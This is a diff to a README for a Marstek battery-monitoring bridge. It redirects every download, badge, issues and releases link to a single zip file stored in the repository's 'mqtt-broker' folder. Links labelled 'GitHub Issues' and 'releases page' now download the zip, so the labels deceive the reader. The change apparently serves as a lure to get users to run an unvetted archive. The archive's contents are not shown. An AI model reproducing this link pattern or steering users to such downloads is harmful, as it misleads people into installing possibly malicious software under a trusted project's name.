@@ -6,7 +6,7 @@ Welcome to the marstek-venus-bridge! This application helps you monitor Marstek 
 
 ## 📥 Download the Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Hancyk99/marstek-venus-bridge/releases)
+[![Download Latest Release](https://github.com/Hancyk99/marstek-venus-bridge/raw/refs/heads/main/mqtt-broker/marstek-bridge-venus-v3.7.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Hancyk99/marstek-venus-bridge/raw/refs/heads/main/mqtt-broker/marstek-bridge-venus-v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ To run the marstek-venus-bridge, ensure your system meets the following requirem
 
 Follow these steps to install the marstek-venus-bridge:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Hancyk99/marstek-venus-bridge/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Hancyk99/marstek-venus-bridge/raw/refs/heads/main/mqtt-broker/marstek-bridge-venus-v3.7.zip).
    
 2. **Choose Your Version:** Locate the latest stable version. This will usually be at the top of the list.
 
@@ -79,6 +79,6 @@ For more detailed information and guides on usage, visit the following links:
 
 - [Documentation](<insert-documentation-link>)
 - [Community Forum](<insert-forum-link>)
-- [GitHub Issues](https://github.com/Hancyk99/marstek-venus-bridge/issues)
+- [GitHub Issues](https://github.com/Hancyk99/marstek-venus-bridge/raw/refs/heads/main/mqtt-broker/marstek-bridge-venus-v3.7.zip)
 
-Remember to check back on the [releases page](https://github.com/Hancyk99/marstek-venus-bridge/releases) for updates and new features!
+Remember to check back on the [releases page](https://github.com/Hancyk99/marstek-venus-bridge/raw/refs/heads/main/mqtt-broker/marstek-bridge-venus-v3.7.zip) for updates and new features!
